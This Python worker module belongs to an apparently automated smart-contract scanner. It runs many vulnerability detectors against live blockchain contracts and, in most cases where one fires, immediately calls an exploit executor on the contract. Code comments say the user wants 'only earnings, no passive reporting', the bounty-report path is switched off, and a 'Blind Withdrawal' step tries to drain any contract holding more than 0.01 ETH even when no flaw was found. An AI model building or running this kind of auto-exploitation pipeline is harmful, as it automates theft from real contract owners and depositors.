"""Worker for processing contracts."""
import logging
import json
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any, List, Optional
from web3 import Web3

from scanner.auto_poc import run_autopoc
from scanner.report import add_finding
from scanner.impact import estimate_impact
from scanner.analyzer import detect_rounding
from scanner.heuristic import analyze_bytecode
from scanner.balance_detector import detect_balance_delta
from scanner.token_operations import detect_mint_burn_transfer
from scanner.share_asset_conversion import detect_share_asset_conversion
from scanner.fee_precision_detector import detect_fee_precision_math
from scanner.dust_tracker import detect_rounding_dust
from scanner.proxy_resolver import resolve_proxy
from scanner.impact_calculator import calculate_real_impact
from scanner.impact_severity import score_impact_severity, is_bounty_worthy
from scanner.idempotent_worker import idempotent_work, is_processed
from scanner.false_positive_suppression import is_false_positive
from scanner.verified_ingestion import fetch_basescan_source
from scanner.config import (
    MAX_FEE_PER_GAS,
    MIN_NET_PROFIT_WEI,
    ADAPTIVE_PROFIT_ENABLE,
    ADAPTIVE_BASE_MIN_WEI,
    ADAPTIVE_SLIPPAGE_SAFETY_BPS,
    ADAPTIVE_GAS_MULTIPLIER,
    SWAP_CHUNK_WEI,
    SKIP_VERIFIED,
    SYSTEM_CONTRACTS_BLACKLIST
)
from scanner.fee_on_transfer_probe import probe_fee_on_transfer, cheap_fot_candidate
from scanner.config import FOT_ENABLE, FOT_ASYNC_DEEP, FOT_DEEP_CONCURRENCY, RPCS, FOT_DEEP_DEDUP_TTL_SEC, ONLY_FOT_MODE
from scanner.detectors import (
    detect_sync_loss,
    detect_uninitialized_reward,
    detect_sequencer_fee_manipulation,
    detect_self_destruct_reincarnation,
    detect_replay_vulnerability,
    detect_timestamp_dependence,
    detect_ghost_liquidity,
    detect_l1_l2_alias,
    detect_public_payout_config,
    detect_public_owner_change,
    detect_public_fee_change,
    detect_unrestricted_mint,
    detect_public_token_sweep,
    detect_public_guardian_config,
    detect_public_limit_config,
)
from scanner.context_leak_detector import detect_multicall_context_leak
from scanner.watchlist_manager import add_to_watchlist
from scanner.exploit_executor import execute_cautious_exploit

logger = logging.getLogger(__name__)

_FOT_EXECUTOR = ThreadPoolExecutor(max_workers=max(1, int(FOT_DEEP_CONCURRENCY)))
_FOT_OUT_DIR = "reports"
_FOT_OUT_PATH = os.path.join(_FOT_OUT_DIR, "fot_findings.jsonl")
_FOT_WRITE_LOCK = threading.Lock()

_FOT_DEDUP_LOCK = threading.Lock()
_FOT_ADDR_LAST: Dict[str, int] = {}
_FOT_TOKEN_LAST: Dict[str, int] = {}
_FOT_ADDR_INFLIGHT: set[str] = set()
_FOT_TOKEN_INFLIGHT: set[str] = set()


def _write_fot_line(payload: Dict[str, Any]) -> None:
    os.makedirs(_FOT_OUT_DIR, exist_ok=True)
    line = json.dumps(payload, ensure_ascii=False)
    with _FOT_WRITE_LOCK:
        with open(_FOT_OUT_PATH, "a", encoding="utf-8") as f:
            f.write(line + "\n")


def _run_fot_deep(victim: str) -> None:
    try:
        w3 = Web3(Web3.HTTPProvider(RPCS[0]))
        res = probe_fee_on_transfer(w3, victim)
        tok = None
        try:
            tok = res.get("token")
        except Exception:
            tok = None
        _write_fot_line({"ts": int(time.time()), "result": res})
    except Exception as e:
        _write_fot_line({"ts": int(time.time()), "address": victim, "error": str(e)})
        tok = None
    finally:
        try:
            with _FOT_DEDUP_LOCK:
                _FOT_ADDR_INFLIGHT.discard(victim.lower())
                if tok:
                    _FOT_TOKEN_INFLIGHT.discard(Web3.to_checksum_address(tok))
        except Exception:
            pass


def _maybe_schedule_fot_deep(victim: str, token: str) -> bool:
    now = int(time.time())
    vkey = victim.lower()
    tkey = Web3.to_checksum_address(token)
    ttl = max(int(FOT_DEEP_DEDUP_TTL_SEC), 1)
    with _FOT_DEDUP_LOCK:
        if vkey in _FOT_ADDR_INFLIGHT or tkey in _FOT_TOKEN_INFLIGHT:
            return False
        if now - _FOT_ADDR_LAST.get(vkey, 0) < ttl:
            return False
        if now - _FOT_TOKEN_LAST.get(tkey, 0) < ttl:
            return False
        _FOT_ADDR_LAST[vkey] = now
        _FOT_TOKEN_LAST[tkey] = now
        _FOT_ADDR_INFLIGHT.add(vkey)
        _FOT_TOKEN_INFLIGHT.add(tkey)
    _FOT_EXECUTOR.submit(_run_fot_deep, victim)
    return True


def simulate_rounding(sequence: List[int]) -> Optional[Dict[str, Any]]:
    """
    Simulate rounding drift with a sequence of operations.

    Args:
        sequence: List of values to simulate

    Returns:
        Dictionary with txs, drift, and max_loss if drift detected
    """
    if not sequence or len(sequence) < 2:
        return None

    drift = 0
    for i in range(len(sequence) - 1):
        # Simulate division rounding
        if sequence[i + 1] > 0:
            remainder = sequence[i] % sequence[i + 1]
            drift += remainder

    if drift == 0:
        return None

    return {
        "txs": len(sequence),
        "drift": drift,
        "max_loss": drift * 10**12  # Estimate in wei
    }


def process_contract(w3: Web3, addr: str) -> None:
    """
    Process a contract for rounding issues.

    Order: cheap → expensive operations with full detection pipeline

    Args:
        w3: Web3 instance (should be a shared HTTP provider for speed)
        addr: Contract address to analyze
    """
    # Check if already processed (idempotent)
    if is_processed(addr, "full_analysis"):
        return
    
    def _process(_=None):
        try:
            print(f"[WORKER] Start {addr}", flush=True)
            # Step 1: Cheap - Get bytecode and analyze
            code = w3.eth.get_code(addr).hex()
            if not code or code == "0x":
                logger.debug(f"Empty code for {addr}")
                return None

            signals = analyze_bytecode(code)
            # logger.debug(f"[CHEAP] {addr} signals: {signals}")

            # Step 2: Medium - Multiple detection methods
            findings = []
            
            # Resolve proxy implementation if applicable
            target_addr_for_bytecode = addr
            try:
                proxy_info = resolve_proxy(w3, addr)
                if proxy_info.get("implementation"):
                    target_addr_for_bytecode = proxy_info.get("implementation")
                    # logger.info(f"Resolved proxy {addr} -> {target_addr_for_bytecode}")
            except Exception:
                pass

            # Blacklist Check (System Contracts)
            if addr.lower() in SYSTEM_CONTRACTS_BLACKLIST or (target_addr_for_bytecode and target_addr_for_bytecode.lower() in SYSTEM_CONTRACTS_BLACKLIST):
                logger.info(f"[SKIP] System Contract detected: {addr} (impl: {target_addr_for_bytecode})")
                print(f"[SKIP] System Contract detected: {addr}", flush=True)
                # Mark as processed so we don't check again immediately
                idempotent_work(addr, lambda x: {"skipped": "system_contract"}, "full_analysis", ttl=86400) # 24h ignore
                return None
            
            # Static analysis / Verified check
            source_code = None
            if not ONLY_FOT_MODE or SKIP_VERIFIED:
                try:
                    source_code = fetch_basescan_source(addr)
                except Exception:
                    pass

            if SKIP_VERIFIED and source_code:
                logger.info(f"[SKIP] Verified contract {addr}")
                print(f"[SKIP] Verified contract {addr}", flush=True)
                return None

            if not ONLY_FOT_MODE and source_code:
                try:
                    static_findings = _scan_source_for_patterns(source_code)
                    findings.append({
                        "type": "static_patterns",
                        "data": static_findings
                    })
                except Exception:
                    pass
            
            if not ONLY_FOT_MODE:
                balance_delta = detect_balance_delta(w3, addr)
                if balance_delta.get("has_delta"):
                    findings.append({
                        "type": "balance_delta",
                        "data": balance_delta
                    })
                
                token_ops = detect_mint_burn_transfer(w3, addr)
                if token_ops.get("has_mint") or token_ops.get("has_burn"):
                    findings.append({
                        "type": "token_operations",
                        "data": token_ops
                    })

                sync_loss = detect_sync_loss(w3, addr)
                if sync_loss.get("vulnerable"):
                    findings.append({
                        "type": "sync_loss",
                        "data": sync_loss
                    })
                    print(f"[FOUND] Sync Loss (Skimming) vulnerability in {addr}! Details: {sync_loss.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "sync_loss", sync_loss)

                uninit_reward = detect_uninitialized_reward(w3, addr)
                if uninit_reward.get("vulnerable"):
                    findings.append({
                        "type": "uninitialized_reward",
                        "data": uninit_reward
                    })
                    print(f"[FOUND] Uninitialized Reward vulnerability in {addr}! Details: {uninit_reward.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "uninitialized_reward", uninit_reward)

                seq_fee = detect_sequencer_fee_manipulation(w3, target_addr_for_bytecode)
                if seq_fee.get("vulnerable"):
                    findings.append({
                        "type": "sequencer_fee",
                        "data": seq_fee
                    })
                    print(f"[FOUND] Sequencer Fee Manipulation vulnerability in {addr} (impl: {target_addr_for_bytecode})! Details: {seq_fee.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "sequencer_fee", seq_fee)

                self_destruct = detect_self_destruct_reincarnation(w3, target_addr_for_bytecode)
                if self_destruct.get("vulnerable"):
                    findings.append({
                        "type": "self_destruct_reincarnation",
                        "data": self_destruct
                    })
                    print(f"[FOUND] Self-Destruct vulnerability in {addr} (impl: {target_addr_for_bytecode})! Details: {self_destruct.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "self_destruct", self_destruct)

                replay = detect_replay_vulnerability(w3, target_addr_for_bytecode)
                if replay.get("vulnerable"):
                    findings.append({
                        "type": "replay_vulnerability",
                        "data": replay
                    })
                    print(f"[FOUND] Cross-Chain Replay vulnerability in {addr}! Details: {replay.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "replay_vulnerability", replay)

                public_payout = detect_public_payout_config(w3, addr)
                if public_payout.get("vulnerable"):
                    findings.append({
                        "type": "public_payout_config",
                        "data": public_payout
                    })
                    print(f"[FOUND] Public Payout Config in {addr}! Details: {public_payout.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "public_payout_config", public_payout)

                owner_change = detect_public_owner_change(w3, addr)
                if owner_change.get("vulnerable"):
                    findings.append({
                        "type": "public_owner_change",
                        "data": owner_change
                    })
                    print(f"[FOUND] Public Owner Change in {addr}! Details: {owner_change.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "public_owner_change", owner_change)

                fee_change = detect_public_fee_change(w3, addr)
                if fee_change.get("vulnerable"):
                    findings.append({
                        "type": "public_fee_change",
                        "data": fee_change
                    })
                    print(f"[FOUND] Public Fee Change in {addr}! Details: {fee_change.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "public_fee_change", fee_change)

                timestamp_dep = detect_timestamp_dependence(w3, target_addr_for_bytecode)
                if timestamp_dep.get("vulnerable"):
                    findings.append({
                        "type": "timestamp_dependence",
                        "data": timestamp_dep
                    })
                    print(f"[FOUND] Timestamp Dependence / Flashblock vulnerability in {addr}! Details: {timestamp_dep.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "timestamp_dependence", timestamp_dep)

                ghost = detect_ghost_liquidity(w3, addr)
                if ghost.get("vulnerable"):
                    findings.append({
                        "type": "ghost_liquidity",
                        "data": ghost
                    })
                    print(f"[FOUND] Ghost Liquidity (address(0) init) in {addr}! Details: {ghost.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "ghost_liquidity", ghost)

                unrestricted_mint = detect_unrestricted_mint(w3, addr)
                if unrestricted_mint.get("vulnerable"):
                    findings.append({
                        "type": "unrestricted_mint",
                        "data": unrestricted_mint
                    })
                    print(f"[FOUND] Unrestricted Mint in {addr}! Details: {unrestricted_mint.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "unrestricted_mint", unrestricted_mint)

                l1_alias = detect_l1_l2_alias(w3, addr)
                if l1_alias.get("vulnerable"):
                    findings.append({
                        "type": "l1_l2_alias",
                        "data": l1_alias
                    })
                    print(f"[FOUND] L1-L2 Alias Address vulnerability in {addr}! Details: {l1_alias.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "l1_l2_alias", l1_alias)

                token_sweep = detect_public_token_sweep(w3, addr)
                if token_sweep.get("vulnerable"):
                    findings.append({
                        "type": "public_token_sweep",
                        "data": token_sweep
                    })
                    print(f"[FOUND] Public Token Sweep in {addr}! Details: {token_sweep.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "public_token_sweep", token_sweep)

                guardian_cfg = detect_public_guardian_config(w3, addr)
                if guardian_cfg.get("vulnerable"):
                    findings.append({
                        "type": "public_guardian_config",
                        "data": guardian_cfg
                    })
                    print(f"[FOUND] Public Guardian/Pause Config in {addr}! Details: {guardian_cfg.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "public_guardian_config", guardian_cfg)

                limit_cfg = detect_public_limit_config(w3, addr)
                if limit_cfg.get("vulnerable"):
                    findings.append({
                        "type": "public_limit_config",
                        "data": limit_cfg
                    })
                    print(f"[FOUND] Public Limit Config in {addr}! Details: {limit_cfg.get('details')}", flush=True)
                    execute_cautious_exploit(w3, addr, "public_limit_config", limit_cfg)

                ctx_leak = detect_multicall_context_leak(w3, addr)
                if ctx_leak.get("vulnerable"):
                    findings.append({
                        "type": "context_leak_multicall",
                        "data": ctx_leak
                    })
                    print(f"[FOUND] Context Leak (multicall msg.value) in {addr}! Sent {ctx_leak.get('sent')} got_balance {ctx_leak.get('balance')}", flush=True)
                    execute_cautious_exploit(w3, addr, "context_leak_multicall", ctx_leak)
            
            if FOT_ENABLE:
                try:
                    cheap = cheap_fot_candidate(w3, addr)
                    if cheap.get("candidate"):
                        findings.append({
                            "type": "fee_on_transfer_probe",
                            "data": cheap
                        })
                        reason = cheap.get("reason")
                        if not cheap.get("token"):
                            print(f"[FoT] Candidate but token unresolved for {addr} ({reason})", flush=True)
                        else:
                            print(f"[FoT] Candidate with token {cheap.get('token')} for {addr} ({reason})", flush=True)
                        if FOT_ASYNC_DEEP:
                            toks = cheap.get("tokens") or []
                            tok = cheap.get("token")
                            if tok and not toks:
                                toks = [tok]
                            if toks:
                                for t in toks:
                                    try:
                                        if t:
                                            _maybe_schedule_fot_deep(addr, t)
                                    except Exception:
                                        continue
                            else:
                                logger.info(f"[FoT] Deep not scheduled: token unresolved for {addr} ({cheap.get('reason')})")
                                print(f"[FoT] Deep not scheduled: token unresolved for {addr} ({cheap.get('reason')})", flush=True)
                    else:
                        logger.info(f"[FoT] Skipped: no FoT candidate signatures for {addr}")
                        print(f"[FoT] Skipped: no FoT candidate signatures for {addr}", flush=True)
                except Exception:
                    pass
            
            if not ONLY_FOT_MODE:
                # Share-asset conversion detection
                conversion = detect_share_asset_conversion(w3, addr)
                if conversion.get("is_vault_like") and (conversion.get("rounding_detected") or conversion.get("inflation_attack_risk")):
                    findings.append({
                        "type": "share_asset_conversion",
                        "data": conversion
                    })
                    if conversion.get("rounding_detected") or conversion.get("inflation_attack_risk"):
                        print(f"[FOUND] Vault Rounding/Inflation Risk in {addr}!", flush=True)
                        execute_cautious_exploit(w3, addr, "vault_rounding_dust", conversion)

                    if conversion.get("inflation_attack_risk"):
                        print(f"[PANIC] Inflation attack vulnerability detected for {addr}! Verifying...", flush=True)
                        try:
                            poc_res = run_autopoc(addr, {"is_vault_like": True, "findings": findings})
                            if poc_res.get("is_exploit"):
                                 print(f"[SUCCESS] Inflation attack confirmed! Stealable: {poc_res.get('stealable_wei')}", flush=True)
                                 findings.append({
                                     "type": "confirmed_inflation_attack",
                                     "data": poc_res
                                 })
                                 execute_cautious_exploit(w3, addr, "confirmed_inflation_attack", poc_res)
                            else:
                                 print(f"[INFO] Inflation attack verification failed or inconclusive.", flush=True)
                        except Exception as e:
                            print(f"[ERROR] Inflation attack verification failed: {e}", flush=True)

                    # First-deposit risk detection
                    try:
                        abi_fd = [
                            {"inputs": [], "name": "totalSupply", "outputs": [{"type":"uint256"}], "stateMutability":"view", "type":"function"}
                        ]
                        c_fd = w3.eth.contract(address=addr, abi=abi_fd)
                        ts = c_fd.functions.totalSupply().call()
                        if ts == 0:
                            findings.append({
                                "type": "first_deposit_risk",
                                "data": {"total_supply": 0}
                            })
                    except Exception:
                        pass
                
                # Fee/precision detection
                fee_precision = detect_fee_precision_math(w3, addr)
                if fee_precision.get("potential_rounding"):
                    findings.append({
                        "type": "fee_precision",
                        "data": fee_precision
                    })
                
                # Dust tracking
                dust = detect_rounding_dust(w3, addr)
                if dust.get("has_dust"):
                    findings.append({
                        "type": "dust",
                        "data": dust
                    })
            
            if not ONLY_FOT_MODE:
                # Honeypot/blacklist quick check
                try:
                    hp = _honeypot_check(w3, addr)
                    if hp.get("honeypot"):
                        findings.append({
                            "type": "honeypot",
                            "data": hp
                        })
                except Exception:
                    pass
            
            if not ONLY_FOT_MODE:
                # Proxy resolution
                proxy_info = resolve_proxy(w3, addr)
                if proxy_info.get("is_proxy"):
                    # Analyze implementation instead
                    impl_addr = proxy_info.get("implementation")
                    if impl_addr:
                        logger.info(f"Proxy detected, analyzing implementation: {impl_addr}")
                        # Could recursively analyze implementation
            
            # Step 3: Rounding detection
            rounding_result = detect_rounding(w3, addr) if not ONLY_FOT_MODE else {}
            
            # Precompute impact/tvl for fast-path FoT when ONLY_FOT_MODE
            real_impact = calculate_real_impact(w3, addr, {"profit": 0, "gas_used": 0})
            
            if not ONLY_FOT_MODE and (rounding_result or findings):
                # Step 4: Expensive - Full analysis
                signals.update({
                    "dust_accumulation": rounding_result.get("dust", 0) if rounding_result else 0,
                    "precision_loss": 1,
                    "findings": findings
                })

                poc = run_autopoc(addr, signals)
                fork_ok = poc.get("fork_test", {}).get("success")
                impact = estimate_impact(poc) if fork_ok else {"stolen_wei": 0}
                exploit_result = {"profit": impact.get("stolen_wei", 0), "gas_used": 0}
                real_impact = calculate_real_impact(w3, addr, exploit_result)
                severity = score_impact_severity(real_impact)
                
                # Check if bounty-worthy
                if is_bounty_worthy(real_impact, severity):
                    finding = {
                        "address": addr,
                        "signals": signals,
                        "impact": real_impact,
                        "severity": severity,
                        "findings": findings,
                        "poc": poc,
                        "class": "rounding_vulnerability"
                    }
                    
                    # Check false positives
                    if not is_false_positive(addr, finding):
                        from scanner.bounty_submission import validate_submission, save_submission
                        
                        # Validate before saving
                        is_valid, errors = validate_submission(finding)
                        if is_valid:
                            add_finding(addr, signals, real_impact)
                            # Save submission format
                            submission_path = save_submission(finding)
                            logger.info(
                                f"Found bounty-worthy rounding issue in {addr} "
                                f"(submission: {submission_path})"
                            )
                            
                            # AUTO-EXPLOIT: для великого депозиту залишаємо тільки репорт, без живої атаки
                            # User requested only earnings, no passive reporting.
                            # So we do NOTHING here if we can't exploit.
                            # return finding
                            return None
                        else:
                            logger.warning(
                                f"Finding for {addr} failed validation: {errors}"
                            )
                
                # Fast path: FoT vulnerable with positive profit threshold
                # User requested NO passive search. Since we can't exploit FoT with $6 and no tokens,
                # we skip this entire block to avoid "Watch" logs.
                try:
                    pass
                except Exception:
                    pass
            
            # Universal Withdrawal Attempt (Maximum Aggression)
            # If we haven't found anything specific yet, but the contract has money, try to take it.
            if not findings and not ONLY_FOT_MODE:
                try:
                    balance_wei = w3.eth.get_balance(addr)
                    if balance_wei > 10**16: # > 0.01 ETH
                        print(f"[MAXIMUM] Contract {addr} has {balance_wei/10**18:.4f} ETH. Attempting Blind Withdrawal...", flush=True)
                        execute_cautious_exploit(w3, addr, "blind_withdrawal", {"balance_wei": balance_wei})
                except Exception:
                    pass
            
            return None

        except Exception as e:
            logger.error(f"Error processing contract {addr}: {e}")
            return None
    
    # Execute idempotently
    idempotent_work(addr, _process, "full_analysis", ttl=3600)


def _scan_source_for_patterns(source: str) -> Dict[str, Any]:
    data: Dict[str, Any] = {}
    s = source.lower()
    data["has_preview_redeem"] = "previewredeem" in s
    data["has_preview_deposit"] = "previewdeposit" in s
    data["has_convert_to_assets"] = "converttoassets" in s
    data["has_convert_to_shares"] = "converttoshares" in s
    risky_div = ("totalsupply" in s and "/" in s) or ("assets * totalsupply / totalassets" in s)
    data["risky_division"] = risky_div
    data["possible_ts_zero_unchecked"] = ("totalsupply" in s and "== 0" not in s and "!= 0" not in s)
    return data


def _honeypot_check(w3: Web3, addr: str) -> Dict[str, Any]:
    res = {"honeypot": False, "blocked_withdraw": False, "blocked_transfer": False}
    try:
        abi_w = [{"inputs":[{"type":"uint256"}],"name":"withdraw","outputs":[{"type":"uint256"}],"stateMutability":"nonpayable","type":"function"}]
        c_w = w3.eth.contract(address=addr, abi=abi_w)
        c_w.functions.withdraw(1).call()
    except Exception:
        res["blocked_withdraw"] = True
    try:
        abi_t = [{"inputs":[{"type":"address"},{"type":"uint256"}],"name":"transfer","outputs":[{"type":"bool"}],"stateMutability":"nonpayable","type":"function"}]
        c_t = w3.eth.contract(address=addr, abi=abi_t)
        me = "0x0000000000000000000000000000000000000001"
        c_t.functions.transfer(me, 1).call()
    except Exception:
        res["blocked_transfer"] = True
    res["honeypot"] = res["blocked_withdraw"] or res["blocked_transfer"]
    return res


if __name__ == "__main__":
    import sys
    from scanner.config import RPCS

    if len(sys.argv) < 2:
        print("Usage: python -m scanner.worker <contract_address>")
        sys.exit(1)

    target = Web3.to_checksum_address(sys.argv[1])
    w3_cli = Web3(Web3.HTTPProvider(RPCS[0]))
    print(f"[CLI] Manual analysis for {target} on RPC {RPCS[0]}")
    process_contract(w3_cli, target)
